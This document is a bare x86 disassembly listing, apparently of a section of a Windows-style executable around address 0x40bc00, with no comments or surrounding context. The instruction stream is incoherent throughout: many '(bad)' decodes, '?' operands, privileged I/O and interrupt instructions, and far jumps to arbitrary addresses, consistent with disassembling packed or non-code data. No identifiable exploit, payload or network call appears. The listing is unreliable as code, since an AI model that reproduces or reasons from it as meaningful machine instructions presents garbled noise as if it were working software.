  40bbb7:	pop    edi
  40bbb8:	cmovo  ebp,DWORD PTR [eax+0x3c722110]
  40bbbf:	fmul   DWORD PTR [edx]
  40bbc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbc2:	xchg   edx,eax
  40bbc3:	es xor eax,0xf2dc0ae7
  40bbc9:	and    eax,0x59624cb6
  40bbce:	adc    bl,dh
  40bbd0:	cmp    DWORD PTR [esi-0x45],ebx
  40bbd3:	dec    esi
  40bbd4:	hlt    
  40bbd5:	fist   DWORD PTR [ebx+0x193f0131]
  40bbdb:	shl    DWORD PTR [edi+0x43],cl
  40bbde:	mov    dl,0xe6
  40bbe0:	jbe    0x40bbec
  40bbe2:	in     al,0x23
  40bbe4:	push   ecx
  40bbe5:	(bad)  [edi-0x1efd5cd5]
  40bbeb:	jo     0x40bc43
  40bbed:	aaa    
  40bbee:	sub    eax,0x8b70566e
  40bbf3:	jg     0x40bbe7
  40bbf5:	cmp    DWORD PTR [ebx*1+0x5bafd50a],0x27075373
  40bc00:	inc    eax
  40bc01:	adc    eax,0xcc71f9e9
  40bc06:	inc    eax
  40bc07:	and    DWORD PTR [ecx],ebx
  40bc09:	fild   DWORD PTR [eax]
  40bc0b:	inc    esi
  40bc0c:	mov    ch,0x98
  40bc0e:	aas    
  40bc0f:	mov    al,ds:0xa1469341
  40bc14:	push   0x75
  40bc16:	add    edi,ebx
  40bc18:	mov    eax,0x9ef6470a
  40bc1d:	fist   WORD PTR [ecx-0x70]
  40bc20:	mov    dl,0x8b
  40bc22:	or     DWORD PTR [ebx],ecx
  40bc24:	mov    edx,0x19838816
  40bc29:	mov    al,0x34
  40bc2b:	mov    eax,ds:0x4eead10
  40bc30:	sahf   
  40bc31:	add    cl,BYTE PTR [edx]
  40bc33:	ins    DWORD PTR es:[edi],dx
  40bc34:	fld    DWORD PTR [ebp+edi*4-0x25]
  40bc38:	push   ecx
  40bc39:	out    0x9,eax
  40bc3b:	adc    DWORD PTR [eax+0x40],ebp
  40bc3e:	mov    BYTE PTR [eax-0x24cebb52],0xc2
  40bc45:	(bad)
  40bc48:	dec    ecx
  40bc49:	lea    edx,[ebx+edi*2]
  40bc4c:	cmp    al,0x72
  40bc4f:	aaa    
  40bc50:	inc    edi
  40bc51:	push   edi
  40bc52:	jo     0x40bc72
  40bc54:	daa    
  40bc55:	jge    0x40bca3
  40bc57:	sahf   
  40bc58:	sbb    al,0x35
  40bc5a:	xor    eax,0x7fbd4fe5
  40bc5f:	idiv   al
  40bc61:	test   DWORD PTR [edi],ebp
  40bc63:	lahf   
  40bc64:	or     BYTE PTR [edx+0x7b],al
  40bc67:	xor    DWORD PTR [edx-0x11a90071],eax
  40bc6d:	add    BYTE PTR [edx+0x32],bl
  40bc70:	inc    esp
  40bc71:	cmp    BYTE PTR [edi-0x27],dh
  40bc74:	mov    dh,0x4b
  40bc76:	mov    ds:0x5da507f2,eax
  40bc7b:	xchg   ebx,eax
  40bc7c:	pop    esi
  40bc7d:	mov    ds:0xeaef381e,al
  40bc82:	jbe    0x40bc25
  40bc84:	mov    BYTE PTR [ebx],ch
  40bc86:	retf   
  40bc87:	mov    ds:0xb6568442,al
  40bc8c:	xchg   esi,eax
  40bc8d:	push   esi
  40bc8e:	jg     0x40bc74
  40bc90:	jg     0x40bd02
  40bc92:	rcr    DWORD PTR [ebx+0x536b85d3],1
  40bc98:	(bad)  
  40bc99:	iret   
  40bc9a:	aaa    
  40bc9b:	dec    ecx
  40bc9c:	std    
  40bc9d:	cmc    
  40bc9e:	dec    ebp
  40bc9f:	sub    al,0x63
  40bca1:	rol    DWORD PTR [esi-0x5d],1
  40bca4:	repz jmp 0x40bcda
  40bca7:	scas   eax,DWORD PTR es:[edi]
  40bca8:	cmp    BYTE PTR [ecx+0x198f86dd],bl
  40bcae:	jp     0x40bc9d
  40bcb0:	or     DWORD PTR [ebx-0x4b4ade88],ecx
  40bcb6:	sub    BYTE PTR [bp+di],bl
  40bcb9:	loopne 0x40bcdb
  40bcbb:	sbb    edx,DWORD PTR fs:[eiz*1-0x7efa133f]
  40bcc3:	sub    al,BYTE PTR [esi]
  40bcc5:	psubq  mm4,mm3
  40bcc8:	ja     0x40bcb3
  40bcca:	je     0x40bd23
  40bccc:	int3   
  40bccd:	xor    BYTE PTR [ebp+eiz*8-0x2d],bl
  40bcd1:	xor    dh,ah
  40bcd3:	xor    eax,0x9e23f59d
  40bcd8:	pusha  
  40bcd9:	je     0x40bc67
  40bcdb:	dec    ebx
  40bcdc:	push   ebp
  40bcdd:	mov    esp,0x9f6f091
  40bce2:	jmp    0x40bcf8
  40bce4:	xchg   ecx,eax
  40bce5:	fs or  dh,ah
  40bce8:	cmc    
  40bce9:	jle    0x40bd3c
  40bceb:	call   0x387c9c15
  40bcf0:	es int3 
  40bcf2:	mov    al,0x9e
  40bcf4:	arpl   WORD PTR [ecx],si
  40bcf6:	mov    ch,0xa
  40bcf8:	sbb    BYTE PTR [ebp+0x7e],0x6a
  40bcfc:	inc    eax
  40bcfd:	jecxz  0x40bd1f
  40bcff:	mov    edi,0x8735d5fb
  40bd04:	sbb    eax,0xed57ae73
  40bd09:	xor    al,0x6
  40bd0b:	push   ds
  40bd0c:	xchg   edi,eax
  40bd0d:	fwait
  40bd0e:	in     eax,0x63
  40bd10:	xchg   BYTE PTR [ecx+0x3],dl
  40bd13:	pop    ebp
  40bd14:	push   0x89a8ef64
  40bd19:	inc    ebp
  40bd1a:	push   ebp
  40bd1b:	dec    eax
  40bd1c:	cmp    ecx,edi
  40bd1e:	cmp    eax,0x2a749af8
  40bd23:	adc    al,0x87
  40bd25:	neg    BYTE PTR [eax]
  40bd27:	cmp    ebx,esi
  40bd29:	pop    esi
  40bd2a:	inc    edx
  40bd2b:	mov    WORD PTR [eax-0x56],?
  40bd2e:	jne    0x40bd48
  40bd30:	ret    0x6307
  40bd33:	into   
  40bd34:	ins    BYTE PTR es:[edi],dx
  40bd35:	sar    DWORD PTR [esp+ebp*2],1
  40bd38:	push   esi
  40bd39:	cmp    eax,0x287dfb85
  40bd3e:	push   es
  40bd3f:	rcl    ecx,1
  40bd41:	rcr    DWORD PTR [esi],0x2b
  40bd44:	into   
  40bd45:	clc    
  40bd46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd47:	fwait
  40bd48:	pop    esp
  40bd49:	pop    esp
  40bd4a:	adc    eax,0x9867a1a3
  40bd4f:	xchg   edi,eax
  40bd50:	mov    ds:0xd2b7d381,eax
  40bd55:	inc    ebx
  40bd56:	fs int 0x6d
  40bd59:	icebp  
  40bd5a:	in     eax,0x2b
  40bd5c:	cmp    ch,ch
  40bd5e:	pop    ebx
  40bd5f:	mov    eax,0x3ea62243
  40bd64:	pop    ecx
  40bd65:	jmp    0xa7f1344
  40bd6a:	mov    ebx,0x5dc816bc
  40bd6f:	pop    edx
  40bd70:	inc    ebp
  40bd71:	or     bl,BYTE PTR [esi+0x6eeee219]
  40bd77:	cmp    BYTE PTR [eax-0x38],dl
  40bd7a:	loope  0x40bd49
  40bd7c:	or     ah,BYTE PTR [ecx-0x7a89275]
  40bd82:	test   DWORD PTR [edi+0x189c3c0a],ebx
  40bd88:	fcmove st,st(1)
  40bd8a:	and    eax,DWORD PTR [edi]
  40bd8c:	mov    DWORD PTR [ebx+edi*2],0xc9a52159
  40bd93:	cs mov ?,edi
  40bd96:	cmp    ebx,esp
  40bd98:	ins    BYTE PTR es:[edi],dx
  40bd99:	jns    0x40be19
  40bd9b:	xor    ecx,DWORD PTR ds:[edx]
  40bd9e:	add    eax,0xa0e05339
  40bda3:	icebp  
  40bda4:	aaa    
  40bda5:	scas   eax,DWORD PTR es:[edi]
  40bda6:	xchg   esp,eax
  40bda7:	pop    esi
  40bda8:	stos   DWORD PTR es:[edi],eax
  40bda9:	scas   al,BYTE PTR es:[edi]
  40bdaa:	push   ebp
  40bdab:	jb     0x40bdfa
  40bdad:	push   ebp
  40bdaf:	push   edx
  40bdb0:	bound  esi,QWORD PTR [ebp-0x12]
  40bdb3:	adc    bh,BYTE PTR [ebx+0x82af156]
  40bdb9:	rcl    dh,cl
  40bdbb:	push   esi
  40bdbc:	(bad)  [ebx-0x59bb3479]
  40bdc2:	rol    DWORD PTR ds:[edx+0x38],0x42
  40bdc7:	adc    eax,0x3b48b24d
  40bdcc:	lock add ah,BYTE PTR [edx+0x4496211]
  40bdd3:	push   0x30
  40bdd5:	loop   0x40be36
  40bdd7:	inc    ebx
  40bdd8:	push   0x2d89101b
  40bddd:	pop    ebp
  40bdde:	out    0x89,al
  40bde0:	pop    esp
  40bde1:	adc    bh,BYTE PTR [ebp-0x42]
  40bde4:	pop    ebp
  40bde5:	fistp  WORD PTR [ebx+ecx*2-0x4a368b27]
  40bdec:	mov    ecx,0x126d992e
  40bdf1:	aaa    
  40bdf2:	adc    eax,edi
  40bdf4:	dec    esp
  40bdf5:	jmp    0xe5c2dfd2
  40bdfa:	pusha  
  40bdfb:	repnz mov ds:0x9916362b,al
  40be01:	int    0xfb
  40be03:	iret   
  40be04:	arpl   di,cx
  40be06:	aam    0x22
  40be08:	and    eax,0xc1432433
  40be0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be0e:	(bad)  
  40be0f:	xchg   esi,eax
  40be10:	sub    cl,BYTE PTR [edi]
  40be12:	xchg   BYTE PTR [edi+0x57e2b23b],cl
  40be18:	lea    edx,[esp+esi*2+0x1859fd4a]
  40be1f:	icebp  
  40be20:	std    
  40be21:	mov    al,ds:0xc3fbe9b1
  40be26:	cmp    DWORD PTR [ebx+0xe],edx
  40be29:	xor    al,0xee
  40be2b:	pusha  
  40be2c:	cmp    BYTE PTR [edi+esi*2+0x5c],dh
  40be30:	popf   
  40be31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be32:	mov    eax,ds:0x25c540d8
  40be37:	jb     0x40be80
  40be39:	arpl   WORD PTR [esi-0x26],bx
  40be3c:	mov    DWORD PTR [ebp+0x19],ecx
  40be3f:	mov    dh,bh
  40be41:	sub    eax,eax
  40be43:	stc    
  40be44:	xor    ecx,eax
  40be46:	and    cl,BYTE PTR [esi]
  40be48:	imul   esp,DWORD PTR [edi],0xbcedbb5e
  40be4e:	aad    0x26
  40be50:	shl    DWORD PTR [ebp-0x4d],0xd4
  40be54:	aam    0xca
  40be56:	enter  0xc334,0x1d
  40be5a:	sub    BYTE PTR [ebx],ah
  40be5c:	aas    
  40be5d:	xchg   ebx,eax
  40be5e:	mov    edi,0x8ab7476f
  40be63:	into   
  40be64:	sub    DWORD PTR [eax],esi
  40be66:	jmp    0x40be49
  40be68:	shr    DWORD PTR [eax-0x3],1
  40be6b:	fcom   DWORD PTR [ebx+0x5c]
  40be6e:	mov    ebx,0x187fa77b
  40be73:	in     eax,dx
  40be74:	cmp    BYTE PTR [edx-0x35c1b11e],0x2a
  40be7b:	mov    esi,0x4bbaada7
  40be80:	dec    ecx
  40be81:	xchg   ebx,eax
  40be82:	retf   
  40be83:	ss leave 
  40be85:	test   al,0xf8
  40be87:	pop    ss
  40be88:	aam    0xd0
  40be8a:	xor    ch,cl
  40be8c:	xor    eax,0x341aeb44
  40be91:	outs   dx,DWORD PTR ds:[esi]
  40be92:	pop    edx
  40be93:	ins    DWORD PTR es:[edi],dx
  40be94:	sub    al,0xd8
  40be96:	mov    esp,0x847b7469
  40be9b:	xchg   ecx,eax
  40be9c:	(bad)  
  40be9d:	cmp    ch,BYTE PTR [eax-0x6168d939]
  40bea3:	add    DWORD PTR [ebx+0x548b99b],0xffffffc6
  40beaa:	sar    BYTE PTR [edi+0x15f66eee],0x23
  40beb1:	fsubr  DWORD PTR [eax+0x6dc30621]
  40beb7:	test   BYTE PTR ds:0xd926f8cf,ch
  40bebd:	dec    edx
  40bebe:	in     al,dx
  40bebf:	inc    edi
  40bec0:	stos   DWORD PTR es:[edi],eax
  40bec1:	in     eax,0xf3
  40bec3:	mov    ?,WORD PTR [eax-0x3b]
  40bec6:	(bad)  
  40bec7:	cmp    dl,BYTE PTR [esi-0x13]
  40beca:	ja     0x40bf06
  40becc:	adc    edx,DWORD PTR [edx-0x40]
  40becf:	stos   BYTE PTR es:[edi],al
  40bed0:	(bad)  
  40bed1:	add    eax,0x31dfd9
  40bed6:	cmc    
  40bed7:	pop    ebp
  40bed8:	fwait
  40bed9:	xchg   edi,eax
  40beda:	mov    ch,0x4f
  40bedc:	xchg   ebp,eax
  40bedd:	mov    edx,0xc9f1308c
  40bee2:	(bad)  
  40bee3:	ins    DWORD PTR es:[edi],dx
  40bee4:	(bad)  
  40bee6:	dec    eax
  40bee7:	mov    al,0xd3
  40bee9:	dec    ecx
  40beea:	and    bh,ch
  40beec:	lea    eax,es:[edi-0x63d97084]
  40bef3:	pop    ds
  40bef4:	adc    ebp,DWORD PTR [esi+0x7e0541a4]
  40befa:	xchg   edi,eax
  40befb:	mov    dh,0x1d
  40befd:	mov    dh,0x9d
  40beff:	xchg   ebx,eax
  40bf00:	add    eax,0xae902822
  40bf05:	cmp    BYTE PTR [esi],0xee
  40bf08:	bound  ebp,QWORD PTR [esi+0xc22c6a7]
  40bf0e:	ins    BYTE PTR es:[edi],dx
  40bf0f:	ins    DWORD PTR es:[edi],dx
  40bf10:	stos   DWORD PTR es:[edi],eax
  40bf11:	sbb    eax,0xf85c6570
  40bf16:	sub    ebp,DWORD PTR [esi+eiz*2]
  40bf19:	and    DWORD PTR [ecx+0x54],0xfffffff4
  40bf1d:	(bad)  
  40bf1e:	cmp    eax,0x73e094df
  40bf23:	sbb    BYTE PTR [esi+ebp*8-0x64b01652],0x11
  40bf2b:	push   es
  40bf2c:	test   eax,0x59de6a4
  40bf31:	dec    ecx
  40bf32:	push   ecx
  40bf33:	adc    BYTE PTR [bx+si-0x80],bl
  40bf37:	call   DWORD PTR [ebx+esi*8]
  40bf3a:	dec    ebx
  40bf3b:	inc    eax
  40bf3c:	xor    BYTE PTR [esi-0x6a],bl
  40bf3f:	jne    0x40bf84
  40bf41:	lahf   
  40bf42:	loope  0x40bf6c
  40bf44:	jmp    0x40bf32
  40bf46:	fcmovnb st,st(7)
  40bf48:	in     al,0x44
  40bf4a:	dec    esi
  40bf4b:	lds    edi,FWORD PTR [edi]
  40bf4d:	jge    0x40bf12
  40bf4f:	pop    esi
  40bf50:	sahf   
  40bf51:	xor    DWORD PTR [ecx-0x470e1468],edi
  40bf57:	out    0x97,al
  40bf59:	mov    al,0xc
  40bf5b:	rol    cl,0xc3
  40bf5e:	(bad)  
  40bf5f:	sub    eax,0x8ebec308
  40bf64:	and    ah,BYTE PTR [ecx+ebp*1+0x5e]
  40bf68:	cmp    BYTE PTR [edi+0x2e],bh
  40bf6b:	cli    
  40bf6c:	sub    al,0x1a
  40bf6e:	pop    eax
  40bf6f:	jne    0x40bf13
  40bf71:	jmp    0xe8df:0xc33c04ea
  40bf78:	in     al,dx
  40bf79:	scas   eax,DWORD PTR es:[edi]
  40bf7a:	gs inc ecx
  40bf7c:	fwait
  40bf7d:	aad    0x78
  40bf7f:	outs   dx,BYTE PTR ds:[esi]
  40bf80:	rcl    DWORD PTR [edi+0x71f94193],0x90
  40bf87:	sahf   
  40bf88:	imul   eax,eax,0xc
  40bf8b:	mov    fs,WORD PTR [esi-0x46]
  40bf8e:	test   DWORD PTR [ebp-0x54],eax
  40bf91:	fdivr  DWORD PTR [edx]
  40bf93:	sub    al,0xe1
  40bf95:	test   BYTE PTR [edi],0x7d
  40bf98:	pop    ecx
  40bf99:	add    al,BYTE PTR [eax-0x47]
  40bf9c:	ins    BYTE PTR es:[edi],dx
  40bf9d:	retf   0xad1b
  40bfa0:	mov    esp,0x1e2bfe4
  40bfa5:	pop    ecx
  40bfa6:	adc    eax,DWORD PTR [edx-0x4891a090]
  40bfac:	xchg   esp,eax
  40bfad:	cmp    DWORD PTR [ecx],eax
  40bfaf:	div    cl
  40bfb1:	xor    DWORD PTR [edi+0x55],0x58
  40bfb5:	daa    
  40bfb6:	fmul   DWORD PTR [ebp-0x7b669483]
  40bfbc:	mov    eax,ds:0x700ba9d7
  40bfc1:	paddusw mm7,mm3
  40bfc4:	xor    ebp,DWORD PTR ds:0xa399d50f
  40bfca:	fs fwait
  40bfcc:	jo     0x40bf70
  40bfce:	jmp    0xf7d1aaa3
  40bfd3:	fmul   QWORD PTR [esi]
  40bfd5:	xlat   BYTE PTR cs:[ebx]
  40bfd7:	mov    al,0x50
  40bfd9:	jne    0x40bf5b
  40bfdb:	cmp    eax,0xb9fa47c2
  40bfe0:	mov    BYTE PTR cs:[ebx-0x746d6b26],cl
  40bfe7:	jne    0x40c051
  40bfe9:	jb     0x40c042
  40bfeb:	pop    edi
  40bfec:	mov    esi,0xc1aacfcc
  40bff1:	div    BYTE PTR [eax+0x3d956972]
  40bff7:	mov    BYTE PTR [edi-0x62],dh
  40bffa:	dec    edx
  40bffb:	inc    edi
  40bffc:	shl    bl,cl
  40bffe:	push   ss
  40bfff:	out    dx,al
  40c000:	aad    0xd8
  40c002:	aam    0x5f
  40c004:	mov    al,0x1e
  40c006:	mov    cl,BYTE PTR ds:0x9c1d2243
  40c00c:	cmp    BYTE PTR ds:0x8f7d9ad,bl
  40c012:	sti    
  40c013:	adc    al,0x17
  40c015:	loope  0x40c051
  40c017:	ret    0x3230
  40c01a:	xchg   edi,eax
  40c01b:	out    dx,al
  40c01c:	sub    ch,BYTE PTR ds:0xeaebcaa8
  40c022:	jb     0x40c082
  40c024:	loop   0x40bfd1
  40c026:	sbb    al,0xc5
  40c028:	jmp    0x40c052
  40c02a:	mov    ?,WORD PTR [edi+0x33f84d8b]
  40c030:	mov    BYTE PTR ds:0x327298,0x89
  40c037:	add    DWORD PTR [ebx+0x4d8bdc45],ecx
  40c03d:	clc    
  40c03e:	jmp    0x40c549
  40c043:	retf   0xc63f
  40c046:	retf   
  40c047:	leave  
  40c048:	leave  
  40c049:	leave  
  40c04a:	cmp    eax,0xf50d3f64
  40c04f:	out    dx,al
  40c050:	add    ch,BYTE PTR [ebp+eax*4+0x7878a194]
  40c057:	push   0x7c
  40c059:	js     0x40c0d3
  40c05b:	push   es
  40c05c:	sub    al,bl
  40c05e:	or     eax,0x50c65296
  40c063:	jmp    0x1fd0ec5
  40c068:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c069:	and    bl,BYTE PTR [eax+0x182b60db]
  40c06f:	push   ebp
  40c070:	cdq    
  40c071:	pop    edi
  40c072:	push   cs
  40c073:	ds fmul st(6),st
  40c076:	lea    edx,[edi]
  40c078:	mov    bl,0x6f
  40c07a:	fwait
  40c07b:	mov    edi,0xd6330cde
  40c080:	pop    ds
  40c081:	out    dx,al
  40c082:	push   edi
  40c083:	ins    BYTE PTR es:[edi],dx
  40c084:	and    eax,0x79c635d1
  40c089:	(bad)  
  40c08b:	dec    ebx
  40c08c:	sub    eax,0xc30bd8af
  40c091:	je     0x40c0d3
  40c093:	jmp    0xd489:0x1b5a1e43
  40c09a:	sbb    eax,0x137fe215
  40c09f:	add    cl,BYTE PTR [ecx+eax*1]
  40c0a2:	push   esp
  40c0a3:	mov    BYTE PTR [esi-0x4c228d70],al
  40c0a9:	(bad)  
  40c0ab:	adc    BYTE PTR ds:0x2ec8017a,0xfd
  40c0b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0b3:	sar    BYTE PTR [esi+ebp*2+0x1e64106a],1
  40c0ba:	or     al,BYTE PTR [ebx-0x5103998e]
  40c0c0:	enter  0xa42b,0x6f
  40c0c4:	sub    DWORD PTR [ebx],edi
  40c0c6:	lds    ecx,FWORD PTR [esi-0x50]
  40c0c9:	loope  0x40c0af
  40c0cb:	xchg   ecx,eax
  40c0cc:	mov    ch,0x36
  40c0ce:	ja     0x40c052
  40c0d0:	sbb    DWORD PTR [ecx],eax
  40c0d2:	test   dh,bh
  40c0d4:	sub    al,0x2c
  40c0d6:	cmp    edx,DWORD PTR [edi]
  40c0d8:	mov    esp,0xe7926c11
  40c0dd:	test   DWORD PTR [ebp-0x1ff3ede],ebx
  40c0e3:	mov    ds:0x4dcc2d6a,eax
  40c0e8:	cmp    BYTE PTR [eax-0x2c],bl
  40c0eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0ec:	push   0xa395d066
  40c0f1:	out    0x50,al
  40c0f3:	scas   eax,DWORD PTR es:[edi]
  40c0f4:	rcl    DWORD PTR [eax+0x654e2fa6],1
  40c0fa:	std    
  40c0fb:	push   es
  40c0fc:	fadd   QWORD PTR [ecx]
  40c0fe:	in     eax,0x9e
  40c100:	mov    edx,0x9e0cfbe8
  40c105:	aam    0x93
  40c107:	pop    esp
  40c108:	mov    dh,0x13
  40c10a:	ss sti 
  40c10c:	es cld 
  40c10e:	inc    edx
  40c10f:	push   ds
  40c110:	push   cs
  40c111:	sbb    esi,DWORD PTR [edi+0x1b533c2d]
  40c117:	cmp    eax,0xaa2b9700
  40c11c:	xchg   esi,eax
  40c11d:	stc    
  40c11e:	jns    0x40c142
  40c120:	rcl    BYTE PTR [edx+0x4],1
  40c123:	mov    WORD PTR [ecx+esi*8+0x36f8e048],?
  40c12a:	mov    esp,cs
  40c12c:	jae    0x40c108
  40c12e:	xchg   ecx,eax
  40c12f:	add    al,0x2
  40c131:	fisub  WORD PTR [eax-0x7]
  40c134:	add    ebp,DWORD PTR [edi]
  40c136:	inc    ecx
  40c137:	xor    al,BYTE PTR [ecx-0x65]
  40c13a:	xchg   ecx,ebp
  40c13c:	or     cl,BYTE PTR [eax+ecx*1-0x4c]
  40c140:	inc    ebx
  40c141:	pop    edx
  40c142:	ret    0x9921
  40c145:	mov    esi,0x2079fd0c
  40c14a:	stos   DWORD PTR es:[edi],eax
  40c14b:	adc    eax,0x2c3c0742
  40c150:	and    edi,edi
  40c152:	pop    edi
  40c153:	scas   eax,DWORD PTR es:[edi]
  40c154:	or     DWORD PTR [ecx],0xffffff9c
  40c157:	pop    es
  40c158:	fwait
  40c159:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c15a:	out    0xe7,al
  40c15c:	ds push eax
  40c15e:	call   DWORD PTR [esi]
  40c160:	xchg   ebx,ebp
  40c162:	shl    DWORD PTR [edi+edi*1-0x6],1
  40c166:	int    0xf7
  40c168:	ret    
  40c169:	ja     0x40c132
  40c16b:	dec    edi
  40c16c:	mov    al,0xe7
  40c16e:	inc    esp
  40c16f:	pop    ss
  40c170:	(bad)  
  40c171:	jno    0x40c196
  40c173:	or     eax,0xac7dfe21
  40c178:	iret   
  40c179:	mov    ebx,0x7c56cd24
  40c17e:	pop    eax
  40c17f:	repnz ror dh,1
  40c182:	inc    ecx
  40c183:	enter  0x1f91,0x4a
  40c187:	inc    ebx
  40c188:	jae    0x40c1e3
  40c18a:	cmp    eax,0x3777d6fc
  40c18f:	daa    
  40c190:	push   ecx
  40c191:	(bad)
  40c194:	push   ecx
  40c195:	outs   dx,DWORD PTR ds:[esi]
  40c196:	adc    DWORD PTR [edx+0x2ad8e590],edi
  40c19c:	pop    esp
  40c19d:	mov    dl,0x5c
  40c19f:	or     eax,0xae4bbbc4
  40c1a4:	xchg   ecx,eax
  40c1a5:	and    al,0xfe
  40c1a7:	xchg   edx,eax
  40c1a8:	mov    ch,0xc1
  40c1aa:	jecxz  0x40c1c2
  40c1ac:	push   esp
  40c1ad:	retf   0x8c39
  40c1b0:	add    edx,DWORD PTR ds:0x3b8e9058
  40c1b6:	dec    ebp
  40c1b7:	ds out 0x54,al
  40c1ba:	int3   
  40c1bb:	sub    eax,0xaca727c4
  40c1c0:	loopne 0x40c177
  40c1c2:	lods   al,BYTE PTR ds:[esi]
  40c1c3:	mov    al,0x4b
  40c1c5:	dec    ebx
  40c1c6:	lea    edi,[eax-0x6c]
  40c1c9:	idiv   DWORD PTR [ebx-0x6c]
  40c1cc:	dec    ecx
  40c1cd:	loope  0x40c1ba
  40c1cf:	rcl    DWORD PTR [eax+eiz*2-0x199d9946],0x22
  40c1d7:	ja     0x40c186
  40c1d9:	(bad)  
  40c1da:	ret    0x6379
  40c1dd:	pop    ebp
  40c1de:	sbb    eax,0xea233220
  40c1e3:	mov    eax,0x53704a6e
  40c1e8:	sub    edx,DWORD PTR [edi+0x77]
  40c1eb:	test   DWORD PTR [edi],0xf2f0a70f
  40c1f1:	aas    
  40c1f2:	pop    edi
  40c1f3:	stos   DWORD PTR es:[edi],eax
  40c1f4:	jmp    0x32f680a
  40c1f9:	jnp    0x40c191
  40c1fb:	cmp    BYTE PTR [esi+0x39],ch
  40c1fe:	js     0x40c24e
  40c200:	bound  ebx,QWORD PTR [eax-0x1b]
  40c203:	or     ebp,DWORD PTR [ebx]
  40c205:	jnp    0x40c1d7
  40c207:	mov    bh,0xfa
  40c209:	push   DWORD PTR [ebp-0x7]
  40c20c:	xchg   ecx,eax
  40c20d:	mov    eax,ds:0xf350f552
  40c212:	scas   eax,DWORD PTR es:[edi]
  40c213:	test   al,0xa
  40c215:	in     eax,dx
  40c216:	mov    ds:0x33a2945d,al
  40c21b:	rol    DWORD PTR [ebp+0x1f],0xb7
  40c21f:	or     cl,BYTE PTR [ebp-0x76]
  40c222:	sbb    eax,0x961f9aa8
  40c227:	popf   
  40c228:	outs   dx,DWORD PTR ds:[esi]
  40c229:	push   ecx
  40c22a:	cwde   
  40c22b:	xor    al,BYTE PTR [esi]
  40c22d:	push   eax
  40c22e:	mov    dl,0x6d
  40c230:	leave  
  40c231:	stos   DWORD PTR es:[edi],eax
  40c232:	xor    ch,BYTE PTR [eax+ebp*4+0x1568dddf]
  40c239:	or     bh,dl
  40c23b:	mov    ebp,0x914917b8
  40c240:	ja     0x40c220
  40c242:	cmp    eax,0xe03b7a91
  40c247:	push   ebp
  40c248:	into   
  40c249:	pop    esp
  40c24a:	leave  
  40c24b:	test   eax,0x85ca41aa
  40c250:	sar    BYTE PTR [ebp-0x611966f4],cl
  40c256:	push   0x5d
  40c258:	mov    bh,0x8c
  40c25a:	call   0x1f0e20cf
  40c25f:	retf   
  40c260:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c261:	sar    dh,cl
  40c263:	div    DWORD PTR [eax+0x28]
  40c266:	cs sub ebx,esp
  40c269:	jmp    0xef4a1e6c
  40c26e:	mov    cl,0xe8
  40c270:	xchg   edx,eax
  40c271:	retf   
  40c272:	and    bh,BYTE PTR [edx]
  40c274:	rcl    al,1
  40c276:	mov    esi,0x9810098f
  40c27b:	mov    al,0x80
  40c27d:	leave  
  40c27e:	mov    ds:0x4d4106cf,al
  40c283:	inc    esp
  40c284:	pop    edi
  40c285:	and    dl,dh
  40c287:	sub    DWORD PTR [ecx-0x33],edi
  40c28a:	xlat   BYTE PTR ds:[ebx]
  40c28b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c28c:	sbb    ch,BYTE PTR [edx+0x4d]
  40c28f:	dec    ebp
  40c290:	adc    ebp,DWORD PTR [esi]
  40c292:	ins    BYTE PTR es:[edi],dx
  40c293:	add    ah,BYTE PTR [ebx-0x77f8bffd]
  40c299:	pop    edx
  40c29a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c29b:	stos   DWORD PTR es:[edi],eax
  40c29c:	sahf   
  40c29d:	in     eax,dx
  40c29e:	mov    ah,dh
  40c2a0:	scas   eax,DWORD PTR es:[edi]
  40c2a1:	dec    ebp
  40c2a2:	repz les edi,FWORD PTR [eax-0x28687769]
  40c2a9:	sub    esi,ebp
  40c2ab:	mov    ebx,0xc59bbde4
  40c2b0:	push   esp
  40c2b1:	leave  
  40c2b2:	jl     0x40c2fe
  40c2b4:	xchg   DWORD PTR [ecx+0x51be3a66],ebp
  40c2ba:	ins    BYTE PTR es:[edi],dx
  40c2bb:	jbe    0x40c272
  40c2bd:	push   ecx
  40c2be:	xchg   DWORD PTR [ebp-0x45],eax
  40c2c1:	adc    al,0x3c
  40c2c3:	retf   0x392d
  40c2c6:	pop    esp
  40c2c7:	sbb    al,BYTE PTR [eax]
  40c2c9:	fstp   DWORD PTR [edx+ecx*8+0xd]
  40c2cd:	mov    cl,0x38
  40c2cf:	out    0x97,eax
  40c2d1:	ins    BYTE PTR es:[edi],dx
  40c2d2:	iret   
  40c2d3:	enter  0x4824,0x69
  40c2d7:	inc    edi
  40c2d8:	fs stc 
  40c2da:	popf   
  40c2db:	and    al,0xaf
  40c2dd:	mov    ebp,0xf343ad2
  40c2e2:	or     ecx,ebp
  40c2e4:	pop    ss
  40c2e5:	adc    DWORD PTR [ebx+esi*8+0x761b9339],0xffffffd6
  40c2ed:	jmp    edi
  40c2ef:	mov    al,ds:0x500a1add
  40c2f4:	rcr    DWORD PTR [ebx-0x65],0xa8
  40c2f8:	push   ss
  40c2f9:	mov    ds:0xa18a30e9,al
  40c2fe:	fst    QWORD PTR [eax]
  40c300:	dec    ebp
  40c301:	out    0x47,eax
  40c303:	sub    edi,ebx
  40c305:	push   ebx
  40c306:	das    
  40c307:	pop    ss
  40c308:	xchg   esi,eax
  40c309:	call   0x79aa:0x7d0749c4
  40c310:	jle    0x40c365
  40c312:	sti    
  40c313:	xor    al,0x5a
  40c315:	mov    eax,ds:0x370865fe
  40c31a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c31b:	xchg   ebp,eax
  40c31c:	in     eax,0xa1
  40c31e:	mov    esp,0x55d5d753
  40c323:	push   cs
  40c324:	jmp    edi
  40c326:	inc    eax
  40c327:	adc    ch,al
  40c329:	int3   
  40c32a:	call   0x2c4e:0x45a3975c
  40c331:	and    al,0xf3
  40c333:	inc    ebx
  40c334:	pop    edi
  40c335:	mov    dl,0xe8
  40c337:	jg     0x40c317
  40c339:	aaa    
